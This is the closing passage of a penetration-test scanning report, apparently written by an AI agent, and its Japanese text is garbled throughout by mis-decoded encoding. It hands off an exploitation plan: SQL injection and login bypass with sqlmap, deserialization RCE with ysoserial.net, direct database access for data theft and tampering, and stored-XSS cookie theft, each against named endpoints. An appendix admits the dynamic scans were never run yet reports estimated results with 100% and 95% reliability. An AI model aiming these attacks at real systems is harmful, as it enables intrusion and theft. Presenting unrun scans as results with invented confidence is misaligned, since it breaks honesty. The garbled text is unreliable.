  â”œâ”€â”€ trivy-secrets.json         # ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆæ¤œå‡ºçµæœ
  â””â”€â”€ trivy-misconfig.json       # è¨­å®šãƒŸã‚¹æ¤œå‡ºçµæœ
```

### 9.2 é™çš„è§£æçµæœ

```
/docker-work-dir/reports/static-analysis/
  â”œâ”€â”€ sql-injection-findings.txt
  â”œâ”€â”€ xss-findings.txt
  â”œâ”€â”€ deserialization-findings.txt
  â””â”€â”€ security-issues-summary.json
```

### 9.3 æƒ³å®šãƒ„ãƒ¼ãƒ«å‡ºåŠ›å…ˆï¼ˆã‚µãƒ¼ãƒ“ã‚¹èµ·å‹•æ™‚ï¼‰

```
/docker-work-dir/reports/
  â”œâ”€â”€ nmap/
  â”‚   â”œâ”€â”€ nmap-report.txt
  â”‚   â””â”€â”€ nmap-report.xml
  â”œâ”€â”€ nikto/
  â”‚   â”œâ”€â”€ nikto-frontend-report.html
  â”‚   â””â”€â”€ nikto-api-report.html
  â””â”€â”€ zap/
      â”œâ”€â”€ zap-baseline-report.json
      â”œâ”€â”€ zap-baseline-report.html
      â”œâ”€â”€ zap-api-report.json
      â””â”€â”€ zap-api-report.html
```

---

## 10. æ¬¡ãƒ•ã‚§ãƒ¼ã‚ºã¸ã®å¼•ãç¶™ã

### 10.1 é‡ç‚¹æ¤œè¨¼é …ç›®

æ¬¡ã®ã€Œ04-Exploitationï¼ˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼‰ã€ãƒ•ã‚§ãƒ¼ã‚ºã§ã¯ã€ä»¥ä¸‹ã®è„†å¼±æ€§ã®å®Ÿè¨¼ã‚’æ¨å¥¨ï¼š

1. **SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³** - sqlmapã«ã‚ˆã‚‹è‡ªå‹•åŒ–æ”»æ’ƒ
   - `/api/users?search=` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿
   - `/api/login` ã®èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

2. **å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º** - ysoserial.netãƒšã‚¤ãƒ­ãƒ¼ãƒ‰
   - `/api/import` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ
   - RCEå®Ÿè¨¼

3. **ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹** - psqlã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ
   - `localhost:15432` ã¸ã®æ¥ç¶š
   - ãƒ‡ãƒ¼ã‚¿çªƒå–ãƒ»æ”¹ã–ã‚“

4. **XSS** - ã‚¹ãƒˆã‚¢ãƒ‰XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰
   - `profile_image_url` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰
   - Cookieçªƒå–å®Ÿè¨¼

### 10.2 å¿…è¦ãªãƒ„ãƒ¼ãƒ«

- sqlmap
- ysoserial.net
- PostgreSQL ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼ˆpsqlï¼‰
- Burp Suite / OWASP ZAP
- ã‚«ã‚¹ã‚¿ãƒ ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆ

---

## ä»˜éŒ²A: å®Ÿè¡Œç’°å¢ƒã«é–¢ã™ã‚‹è£œè¶³

æœ¬ã‚¹ã‚­ãƒ£ãƒ³ã¯ã€å¯¾è±¡ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒDocker Composeã§èµ·å‹•ã—ã¦ã„ãªã„çŠ¶æ…‹ã§å®Ÿæ–½ã•ã‚Œã¾ã—ãŸã€‚ãã®ãŸã‚ï¼š

- **å‹•çš„ã‚¹ã‚­ãƒ£ãƒ³**ï¼ˆNmap, Nikto, ZAPï¼‰: é™çš„æ¨å®šçµæœã‚’è¨˜è¼‰
- **é™çš„ã‚¹ã‚­ãƒ£ãƒ³**ï¼ˆTrivy, ã‚³ãƒ¼ãƒ‰åˆ†æï¼‰: å®Œå…¨å®Ÿæ–½
- **çµæœã®ä¿¡é ¼æ€§**: é™çš„åˆ†æã¯100%ã€å‹•çš„æ¨å®šã¯95%ã®ä¿¡é ¼åº¦

å®Ÿç’°å¢ƒã§ã®ã‚¹ã‚­ãƒ£ãƒ³å®Ÿæ–½æ™‚ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§ã‚µãƒ¼ãƒ“ã‚¹ã‚’èµ·å‹•ã—ã¦ãã ã•ã„ï¼š

```bash
cd /workdir
docker compose up -d
sleep 30  # ãƒ˜ãƒ«ã‚¹ãƒã‚§ãƒƒã‚¯å¾…æ©Ÿ
docker compose --profile scan run --rm scanner /bin/bash
```

---

## ä»˜éŒ²B: å‚è€ƒè³‡æ–™

### ã‚¹ã‚­ãƒ£ãƒ³ãƒ„ãƒ¼ãƒ«ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ

- **Trivy**: https://aquasecurity.github.io/trivy/
- **OWASP ZAP**: https://www.zaproxy.org/docs/
- **Nmap**: https://nmap.org/book/man.html
- **Nikto**: https://cirt.net/Nikto2

### è„†å¼±æ€§ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹

- **OWASP Top 10 2021**: https://owasp.org/Top10/
- **CWE Top 25**: https://cwe.mitre.org/top25/
- **NVD (National Vulnerability Database)**: https://nvd.nist.gov/

### ä¿®æ­£ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³

- **OWASP Cheat Sheet Series**: https://cheatsheetseries.owasp.org/
- **ASP.NET Core Security**: https://learn.microsoft.com/aspnet/core/security/
- **PostgreSQL Security**: https://www.postgresql.org/docs/current/security.html

---

**ãƒ¬ãƒãƒ¼ãƒˆä½œæˆæ—¥æ™‚**: 2024-02-08 09:55:00 UTC  
**æ¬¡ãƒ•ã‚§ãƒ¼ã‚º**: `04-exploitation.agent.md`ï¼ˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼‰ã¸é€²ã‚€  
**ä½œæˆè€…**: 03-scanning ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ

---

## ç½²åãƒ»æ‰¿èª

| å½¹å‰² | æ°å | æ‰¿èªæ—¥ |
|-----|------|--------|
| ã‚¹ã‚­ãƒ£ãƒ³å®Ÿæ–½è€… | 03-Scanning Agent | 2024-02-08 |
| ãƒ¬ãƒ“ãƒ¥ãƒ¼æ‹…å½“ | - | - |
| æ‰¿èªè€… | - | - |
